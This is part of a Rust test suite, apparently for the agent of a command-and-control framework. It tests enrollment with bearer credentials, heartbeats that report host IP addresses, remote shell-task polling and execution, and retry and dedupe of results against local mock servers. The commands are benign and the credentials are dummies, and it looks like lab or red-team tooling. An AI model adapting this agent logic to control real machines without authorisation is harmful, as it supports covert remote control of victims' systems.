        assert!(outbox.enqueue_at(task.clone(), "2026-07-23T16:30:01.234Z".to_string()));
        let transport = MockTransport::new(
            [SubmissionOutcome::Accepted],
            [SubmissionOutcome::Permanent(
                "result submission failed with status 409 Conflict".to_string(),
            )],
        );
        let executor = CountingExecutor::successful("hello\n");

        outbox
            .process_all_with_clock(&transport, &executor, fixed_now)
            .await;

        assert_eq!(executor.executions(), 1);
        assert!(outbox.has_pending());
        let attempted_result = transport
            .result_attempts()
            .into_iter()
            .next()
            .expect("result submission");
        match outbox.state(&task.id) {
            Some(TaskDeliveryState::BlockedResult { result, reason }) => {
                assert_eq!(*result, attempted_result);
                assert!(reason.contains("409 Conflict"));
            }
            state => panic!("unexpected outbox state: {state:?}"),
        }

        outbox
            .process_all_with_clock(&transport, &executor, fixed_now)
            .await;
        assert_eq!(executor.executions(), 1);
        assert_eq!(transport.result_attempts().len(), 1);
    }

    #[test]
    fn terminal_task_dedupe_retention_is_bounded() {
        let outbox = TaskOutbox::default();
        for index in 0..(MAX_TERMINAL_TASK_IDS + 5) {
            outbox.set_terminal(&format!("task-{index}"), TaskDeliveryState::Delivered);
        }

        assert!(outbox.lock_states().len() <= MAX_TERMINAL_TASK_IDS);
        assert!(outbox.state("task-0").is_none());
        assert!(matches!(
            outbox.state(&format!("task-{}", MAX_TERMINAL_TASK_IDS + 4)),
            Some(TaskDeliveryState::Delivered)
        ));
    }

    #[tokio::test]
    async fn task_at_expiry_boundary_is_blocked_without_acknowledgement_or_execution() {
        let outbox = TaskOutbox::default();
        let mut task = sample_task("echo hello");
        task.expires_at = Some("2026-07-23T16:30:02Z".to_string());
        assert!(outbox.enqueue_at(task.clone(), "2026-07-23T16:30:01.234Z".to_string()));
        let transport = MockTransport::new([], []);
        let executor = CountingExecutor::successful("must not run");

        outbox
            .process_all_with_clock(&transport, &executor, fixed_now)
            .await;

        assert_eq!(executor.executions(), 0);
        assert!(transport.running_attempts().is_empty());
        assert!(transport.result_attempts().is_empty());
        assert!(matches!(
            outbox.state(&task.id),
            Some(TaskDeliveryState::Blocked { .. })
        ));
    }

    #[tokio::test]
    async fn task_poll_enrolls_first_and_never_sends_bootstrap_to_task_route() {
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .expect("bind enrollment test server");
        let server_addr = format!(
            "http://{}",
            listener.local_addr().expect("enrollment test address")
        );
        let requests = Arc::new(Mutex::new(Vec::<String>::new()));
        let captured = requests.clone();
        let server = tokio::spawn(async move {
            for (status, body) in [
                (
                    "200 OK",
                    concat!(
                        r#"{"session_credential":"s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.1."#,
                        r#"Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"}"#
                    ),
                ),
                ("204 No Content", ""),
            ] {
                let (mut stream, _) = listener.accept().await.expect("accept enrollment request");
                let request = read_http_request(&mut stream).await;
                captured
                    .lock()
                    .unwrap_or_else(std::sync::PoisonError::into_inner)
                    .push(request);
                let response = format!(
                    "HTTP/1.1 {status}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                stream
                    .write_all(response.as_bytes())
                    .await
                    .expect("write enrollment response");
            }
        });

        let state_dir = unique_auth_test_dir();
        let config = AgentConfig {
            server_url: server_addr.clone(),
            listener_id: "listener-one".to_string(),
            payload_id: "payload-one".to_string(),
            enrollment_credential: SecretCredential::new_bootstrap(TEST_BOOTSTRAP_CREDENTIAL)
                .expect("bootstrap credential"),
            allow_insecure_isolated_lab: true,
            ..Default::default()
        };
        let auth =
            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("create auth state");

        let task = get_task_with_client(&config, &server_addr, "agent-one", &auth)
            .await
            .expect("poll task");
        server.await.expect("enrollment test server");
        assert!(task.is_none());

        let captured = requests
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        assert_eq!(captured.len(), 2);
        assert!(captured[0].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
        assert_request_auth(&captured[0], TEST_BOOTSTRAP_CREDENTIAL);
        assert!(captured[1].starts_with("GET /api/agent/agent-one/tasks HTTP/1.1"));
        assert_request_auth(&captured[1], TEST_SESSION_ONE);
        drop(captured);

        let _ = fs::remove_dir_all(state_dir);
    }

    #[tokio::test]
    async fn oversized_task_response_is_rejected_before_deserialization() {
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .expect("bind oversized response server");
        let server_addr = format!(
            "http://{}",
            listener.local_addr().expect("oversized response address")
        );
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await.expect("accept task request");
            let request = read_http_request(&mut stream).await;
            assert!(request.starts_with("GET /api/agent/agent-one/tasks HTTP/1.1"));
            assert_request_auth(&request, TEST_SESSION_ONE);
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                MAX_TASK_RESPONSE_BYTES + 1
            );
            stream
                .write_all(response.as_bytes())
                .await
                .expect("write oversized response headers");
        });

        let state_dir = unique_auth_test_dir();
        let config = AgentConfig {
            server_url: server_addr.clone(),
            listener_id: "listener-one".to_string(),
            payload_id: "payload-one".to_string(),
            enrollment_credential: SecretCredential::new_bootstrap(TEST_BOOTSTRAP_CREDENTIAL)
                .expect("bootstrap credential"),
            allow_insecure_isolated_lab: true,
            ..Default::default()
        };
        let auth =
            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("create auth state");
        auth.persist_session(TEST_SESSION_ONE.to_string())
            .expect("persist session");

        let error = get_task_with_client(&config, &server_addr, "agent-one", &auth)
            .await
            .expect_err("oversized task response must fail");
        assert_eq!(error.kind(), io::ErrorKind::InvalidData);
        assert!(error.to_string().contains("exceeds the supported size"));
        server.await.expect("oversized response server");

        let _ = fs::remove_dir_all(state_dir);
    }

    #[tokio::test]
    async fn authenticated_heartbeat_runs_periodically_during_agent_work() {
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .expect("bind periodic heartbeat server");
        let server_addr = format!(
            "http://{}",
            listener.local_addr().expect("heartbeat server address")
        );
        let heartbeat_count = Arc::new(AtomicUsize::new(0));
        let observed = heartbeat_count.clone();
        let server = tokio::spawn(async move {
            while observed.load(Ordering::SeqCst) < 2 {
                let (mut stream, _) = listener.accept().await.expect("accept heartbeat");
                let request = read_http_request(&mut stream).await;
                assert!(request.starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
                assert_request_auth(&request, TEST_SESSION_ONE);
                observed.fetch_add(1, Ordering::SeqCst);
                stream
                    .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                    .await
                    .expect("write heartbeat response");
            }
        });

        let state_dir = unique_auth_test_dir();
        let config = AgentConfig {
            server_url: server_addr.clone(),
            listener_id: "listener-one".to_string(),
            payload_id: "payload-one".to_string(),
            enrollment_credential: SecretCredential::new_bootstrap(TEST_BOOTSTRAP_CREDENTIAL)
                .expect("bootstrap credential"),
            allow_insecure_isolated_lab: true,
            ..Default::default()
        };
        let auth =
            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("create auth state");
        auth.persist_session(TEST_SESSION_ONE.to_string())
            .expect("persist session");
        let heartbeat_task = tokio::spawn(run_authenticated_heartbeat_loop(
            config,
            server_addr,
            "agent-one".to_string(),
            Arc::new(auth),
            Duration::from_millis(10),
        ));

        tokio::time::timeout(Duration::from_secs(2), server)
            .await
            .expect("periodic heartbeat deadline")
            .expect("periodic heartbeat server");
        heartbeat_task.abort();
        let _ = heartbeat_task.await;
        assert!(heartbeat_count.load(Ordering::SeqCst) >= 2);

        let _ = fs::remove_dir_all(state_dir);
    }

    #[tokio::test]
    async fn unauthorized_delivery_reenrolls_and_retries_without_rerunning_task() {
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .expect("bind auth test server");
        let server_addr = format!(
            "http://{}",
            listener.local_addr().expect("auth test server address")
        );
        let requests = Arc::new(Mutex::new(Vec::<String>::new()));
        let captured = requests.clone();
        let server = tokio::spawn(async move {
            let responses = [
                ("401 Unauthorized", ""),
                ("401 Unauthorized", ""),
                (
                    "200 OK",
                    concat!(
                        r#"{"session_credential":"s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.2."#,
                        r#"Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"}"#
                    ),
                ),
                ("200 OK", ""),
                ("401 Unauthorized", ""),
                ("401 Unauthorized", ""),
                (
                    "200 OK",
                    concat!(
                        r#"{"session_credential":"s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.3."#,
                        r#"Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"}"#
                    ),
                ),
                ("200 OK", ""),
            ];
            for (status, body) in responses {
                let (mut stream, _) = listener.accept().await.expect("accept auth request");
                let request = read_http_request(&mut stream).await;
                captured
                    .lock()
                    .unwrap_or_else(std::sync::PoisonError::into_inner)
                    .push(request);
                let response = format!(
                    "HTTP/1.1 {status}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                stream
                    .write_all(response.as_bytes())
                    .await
                    .expect("write auth response");
            }
        });

        let state_dir = unique_auth_test_dir();
        let config = AgentConfig {
            server_url: server_addr.clone(),
            listener_id: "listener-one".to_string(),
            payload_id: "payload-one".to_string(),
            enrollment_credential: SecretCredential::new_bootstrap(TEST_BOOTSTRAP_CREDENTIAL)
                .expect("bootstrap credential"),
            allow_insecure_isolated_lab: true,
            ..Default::default()
        };
        let auth =
            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("create auth state");
        auth.persist_session(TEST_SESSION_ONE.to_string())
            .expect("persist stale session");
        let transport = HttpTaskTransport {
            config: &config,
            server_addr: &server_addr,
            agent_id: "agent-one",
            auth: &auth,
        };
        let outbox = TaskOutbox::default();
        let task = sample_task("echo hello");
        assert!(outbox.enqueue_at(task.clone(), "2026-07-23T16:30:01.234Z".to_string()));
        let executor = CountingExecutor::successful("hello\n");

        outbox
            .process_all_with_clock(&transport, &executor, fixed_now)
            .await;
        server.await.expect("auth test server");

        assert_eq!(executor.executions(), 1);
        assert!(matches!(
            outbox.state(&task.id),
            Some(TaskDeliveryState::Delivered)
        ));
        let captured = requests
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        assert_eq!(captured.len(), 8);
        assert_request_auth(&captured[0], TEST_SESSION_ONE);
        assert!(captured[0].starts_with("POST /api/agent/agent-one/tasks/task-one/status HTTP/1.1"));
        assert_request_auth(&captured[1], TEST_SESSION_ONE);
        assert!(captured[1].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
        assert_request_auth(&captured[2], TEST_BOOTSTRAP_CREDENTIAL);
        assert!(captured[2].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
        assert_request_auth(&captured[3], TEST_SESSION_TWO);
        assert_eq!(http_body(&captured[0]), http_body(&captured[3]));
        assert_request_auth(&captured[4], TEST_SESSION_TWO);
        assert!(captured[4].starts_with("POST /api/agent/agent-one/results HTTP/1.1"));
        assert_request_auth(&captured[5], TEST_SESSION_TWO);
        assert!(captured[5].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
        assert_request_auth(&captured[6], TEST_BOOTSTRAP_CREDENTIAL);
        assert!(captured[6].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
        assert_request_auth(&captured[7], TEST_SESSION_THREE);
        assert!(captured[7].starts_with("POST /api/agent/agent-one/results HTTP/1.1"));
        assert_eq!(http_body(&captured[4]), http_body(&captured[7]));
        drop(captured);

        let restarted =
            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("reload auth state");
        let credential = restarted.active_credential().expect("reloaded credential");
        assert_eq!(credential.source, CredentialSource::Session);
        assert_eq!(credential.credential.expose(), TEST_SESSION_THREE);
        let _ = fs::remove_dir_all(state_dir);
    }

    #[test]
    fn heartbeat_payload_separates_agent_payload_and_listener_ids() {
        let config = AgentConfig {
            payload_id: "payload-one".to_string(),
            listener_id: "listener-one".to_string(),
            ..Default::default()
        };

        let payload = build_heartbeat_payload(
            &config,
            "agent-runtime-one",
            "linux".to_string(),
            "workstation".to_string(),
            vec!["192.0.2.10".to_string()],
            "203.0.113.10".to_string(),
        );

        assert_eq!(payload["id"], "agent-runtime-one");
        assert_eq!(payload["payload_id"], "payload-one");
        assert_eq!(payload["listener_id"], "listener-one");
        assert_eq!(payload["ip"], "192.0.2.10");
        assert_eq!(payload["ip_list"], json!(["192.0.2.10"]));
        assert_eq!(
            payload["module_ids"],
            json!([crate::modules::CAPABILITY_INVENTORY_ID])
        );
        assert_ne!(payload["id"], payload["payload_id"]);
    }

    #[test]
    fn heartbeat_payload_filters_deduplicates_sorts_and_bounds_ip_fields() {
        assert_eq!(
            normalized_local_ips(vec![
                "2001:db8::2".to_string(),
                "192.0.2.2".to_string(),
                "192.0.2.1".to_string(),
                "192.0.2.2".to_string(),
                "127.0.0.1".to_string(),
                "224.0.0.1".to_string(),
                "::1".to_string(),
                "ff02::1".to_string(),
                "not-an-address".to_string(),
                "2001:0db8:0:0:0:0:0:1".to_string(),
            ]),
            vec![
                "192.0.2.1".to_string(),
                "192.0.2.2".to_string(),
                "2001:db8::1".to_string(),
                "2001:db8::2".to_string(),
            ]
        );

        let config = AgentConfig {
            payload_id: "payload-one".to_string(),
            listener_id: "listener-one".to_string(),
            ..Default::default()
        };
        let candidate_sets = [
            (1..=40)
                .map(|suffix| format!("10.0.0.{suffix}"))
                .chain(std::iter::once("10.0.0.1".to_string()))
                .collect::<Vec<_>>(),
            (1..=40)
                .map(|suffix| format!("2001:db8::{suffix:x}"))
                .chain(std::iter::once("2001:db8::1".to_string()))
                .collect::<Vec<_>>(),
        ];

        for candidates in candidate_sets {
            let payload = build_heartbeat_payload(
                &config,
                "agent-runtime-one",
                "linux".to_string(),
                "workstation".to_string(),
                candidates,
                "203.0.113.10".to_string(),
            );
            let ip_list = payload["ip_list"].as_array().expect("IP list array");
            assert_eq!(ip_list.len(), MAX_HEARTBEAT_IP_ENTRIES);

            let parsed: Vec<IpAddr> = ip_list
                .iter()
                .map(|value| {
                    value
                        .as_str()
                        .expect("IP string")
                        .parse()
                        .expect("canonical IP")
                })
                .collect();
            assert!(parsed.windows(2).all(|pair| pair[0] < pair[1]));

            let selected = payload["ip"].as_str().expect("selected IP");
            assert_eq!(selected, ip_list[0].as_str().expect("first IP"));
            assert!(!selected.contains(','));
            assert!(selected.chars().count() <= MAX_HEARTBEAT_NETWORK_FIELD_CHARS);
        }
    }

    fn sample_task(command: &str) -> Task {
        Task {
            schema_version: TASK_SCHEMA_VERSION,
            id: "task-one".to_string(),
            agent_id: "agent-one".to_string(),
            task_type: crate::tasks::TaskType::Shell,
            arguments: crate::tasks::TaskArguments {
                command: command.to_string(),
                ..crate::tasks::TaskArguments::default()
            },
            timeout_seconds: 30,
            status: crate::tasks::TaskStatus::Dispatched,
            created_at: "2026-07-23T16:30:00Z".to_string(),
            queued_at: "2026-07-23T16:30:00Z".to_string(),
            dispatched_at: Some("2026-07-23T16:30:01Z".to_string()),
            started_at: None,
            completed_at: None,
            expires_at: Some("2026-07-23T16:35:00Z".to_string()),
            result: None,
        }
    }

    async fn read_http_request(stream: &mut tokio::net::TcpStream) -> String {
        let mut request = Vec::new();
        let mut buffer = [0_u8; 4096];
        loop {
            let read = stream.read(&mut buffer).await.expect("read auth request");
            if read == 0 {
                break;
            }
            request.extend_from_slice(&buffer[..read]);
            if let Some(header_end) = find_header_end(&request) {
                let headers = String::from_utf8_lossy(&request[..header_end]);
                let content_length = headers
                    .lines()
                    .find_map(|line| {
                        let (name, value) = line.split_once(':')?;
                        name.eq_ignore_ascii_case("content-length")
                            .then(|| value.trim().parse::<usize>().ok())
                            .flatten()
                    })
                    .unwrap_or(0);
                if request.len() >= header_end + 4 + content_length {
                    break;
                }
            }
        }
        String::from_utf8(request).expect("UTF-8 auth request")
    }

    fn find_header_end(request: &[u8]) -> Option<usize> {
        request.windows(4).position(|window| window == b"\r\n\r\n")
    }

    fn assert_request_auth(request: &str, credential: &str) {
        let expected = format!("authorization: Bearer {credential}");
        assert!(
            request
                .lines()
                .any(|line| line.eq_ignore_ascii_case(&expected)),
            "missing expected authorization header in request"
        );
    }

    fn http_body(request: &str) -> &str {
        request.split_once("\r\n\r\n").map_or("", |(_, body)| body)
    }

    fn unique_auth_test_dir() -> PathBuf {
        static NEXT_DIRECTORY_ID: AtomicUsize = AtomicUsize::new(0);
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system time")
            .as_nanos();
        let directory_id = NEXT_DIRECTORY_ID.fetch_add(1, Ordering::Relaxed);
        env::temp_dir().join(format!(
            "microc2-command-auth-{}-{nanos}-{directory_id}",
            std::process::id(),
        ))
    }

    fn fixed_now() -> DateTime<Utc> {
        DateTime::parse_from_rfc3339("2026-07-23T16:30:02Z")
            .expect("fixed RFC3339 timestamp")
            .with_timezone(&Utc)
    }

    struct MockTransport {
        running_outcomes: Mutex<VecDeque<SubmissionOutcome>>,
        result_outcomes: Mutex<VecDeque<SubmissionOutcome>>,
        running_attempts: Mutex<Vec<(String, String)>>,
        result_attempts: Mutex<Vec<TaskResult>>,
    }

    impl MockTransport {
        fn new(
            running_outcomes: impl IntoIterator<Item = SubmissionOutcome>,
            result_outcomes: impl IntoIterator<Item = SubmissionOutcome>,
        ) -> Self {
            Self {
                running_outcomes: Mutex::new(running_outcomes.into_iter().collect()),
                result_outcomes: Mutex::new(result_outcomes.into_iter().collect()),
                running_attempts: Mutex::new(Vec::new()),
                result_attempts: Mutex::new(Vec::new()),
            }
        }

        fn running_attempts(&self) -> Vec<(String, String)> {
            self.running_attempts
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .clone()
        }

        fn result_attempts(&self) -> Vec<TaskResult> {
            self.result_attempts
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .clone()
        }
    }

    impl TaskTransport for MockTransport {
        async fn submit_running(&self, task: &Task, started_at: &str) -> SubmissionOutcome {
            self.running_attempts
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .push((task.id.clone(), started_at.to_string()));
            self.running_outcomes
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .pop_front()
                .unwrap_or(SubmissionOutcome::Accepted)
        }

        async fn submit_result(&self, result: &TaskResult) -> SubmissionOutcome {
            self.result_attempts
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .push(result.clone());
            self.result_outcomes
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .pop_front()
                .unwrap_or(SubmissionOutcome::Accepted)
        }
    }

    struct CountingExecutor {
        count: AtomicUsize,
        execution: ShellExecution,
    }

    impl CountingExecutor {
        fn successful(stdout: &str) -> Self {
            Self {
                count: AtomicUsize::new(0),
                execution: ShellExecution {
                    stdout: stdout.to_string(),
                    stderr: String::new(),
                    exit_code: Some(0),
                    data: None,
                    error: None,
                },
            }
        }

        fn executions(&self) -> usize {
            self.count.load(Ordering::SeqCst)
        }
    }

    impl TaskExecutor for CountingExecutor {
        async fn execute(&self, _task: &Task) -> ShellExecution {
            self.count.fetch_add(1, Ordering::SeqCst);
            self.execution.clone()
        }
    }
}
